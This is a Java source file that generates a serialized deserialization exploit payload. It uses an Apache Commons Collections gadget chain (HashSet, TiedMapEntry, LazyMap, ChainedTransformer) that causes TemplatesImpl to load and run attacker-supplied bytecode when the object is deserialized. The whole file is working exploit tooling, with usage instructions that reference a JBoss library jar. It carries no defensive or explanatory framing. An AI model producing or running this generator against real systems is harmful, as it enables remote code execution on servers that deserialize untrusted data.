import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * RT5: CC6-scaffold (HashSet -> TiedMapEntry -> LazyMap -> ChainedTransformer)
 * but the chain body is swapped to
 *   ConstantTransformer(templates), InvokerTransformer("newTransformer")
 * so TemplatesImpl-loaded ATTACKER bytecode runs in-process (no argv exec, no
 * TrAXFilter, no TransformingComparator -- all Serializable in CC 3.2).
 *
 * Usage: java -cp .:cc32_jboss.jar GenChain6 <out.ser> <Pwn.class>
 */
public class GenChain6 {

    public static void main(String[] args) throws Exception {
        String out = args[0];
        byte[] code = readAll(args[1]);

        Class<?> tc = Class.forName(
            "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Object templates = tc.newInstance();
        setF(tc, templates, "_bytecodes", new byte[][]{code});
        setF(tc, templates, "_name", "pwnrt5");
        try {
            Class<?> tfc = Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");
            setF(tc, templates, "_tfactory", tfc.newInstance());
        } catch (Throwable t) {
            System.out.println("[i] _tfactory skip: " + t);
        }

        Class<?> tClass = Class.forName("org.apache.commons.collections.Transformer");
        Class<?> ccConst = Class.forName(
            "org.apache.commons.collections.functors.ConstantTransformer");
        Class<?> ccInv = Class.forName(
            "org.apache.commons.collections.functors.InvokerTransformer");
        Class<?> ccChain = Class.forName(
            "org.apache.commons.collections.functors.ChainedTransformer");
        Class<?> ccLazy = Class.forName("org.apache.commons.collections.map.LazyMap");

        Object constant = ccConst.getConstructor(Object.class).newInstance(templates);
        Object invoker = ccInv.getConstructor(String.class, Class[].class, Object[].class)
            .newInstance("newTransformer", new Class[0], new Object[0]);
        Object chain = ccChain.getConstructor(tArrayClass())
            .newInstance(toArray(constant, invoker));

        Method decorate = ccLazy.getMethod("decorate", Map.class, tClass);
        Object lazy = decorate.invoke(null, new HashMap(), chain);

        Class<?> tme = Class.forName("org.apache.commons.collections.keyvalue.TiedMapEntry");
        Object entry = tme.getConstructor(Map.class, Object.class).newInstance(lazy, "foo");

        HashSet set = new HashSet(1);
        set.add("foo");
        Field hm = HashSet.class.getDeclaredField("map");
        hm.setAccessible(true);
        HashMap innermap = (HashMap) hm.get(set);
        Field tableF = HashMap.class.getDeclaredField("table");
        tableF.setAccessible(true);
        Object[] table = (Object[]) tableF.get(innermap);
        Object node = table[0];
        if (node == null) {
            node = table[1];
        }
        Field keyF = node.getClass().getDeclaredField("key");
        keyF.setAccessible(true);
        keyF.set(node, entry);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(out));
        oos.writeObject(set);
        oos.close();
        System.out.println("OK " + out);
    }

    static Class<?> tArrayClass() throws Exception {
        return Class.forName("[Lorg.apache.commons.collections.Transformer;");
    }

    static Object toArray(Object a, Object b) throws Exception {
        Object arr = Array.newInstance(
            Class.forName("org.apache.commons.collections.Transformer"), 2);
        Array.set(arr, 0, a);
        Array.set(arr, 1, b);
        return arr;
    }

    static void setF(Class<?> start, Object o, String n, Object v) throws Exception {
        Class<?> c = start;
        while (c != null) {
            try {
                Field f = c.getDeclaredField(n);
                f.setAccessible(true);
                f.set(o, v);
                return;
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        throw new NoSuchFieldException(n);
    }

    static byte[] readAll(String p) throws IOException {
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        FileInputStream in = new FileInputStream(p);
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
        in.close();
        return bos.toByteArray();
    }
}
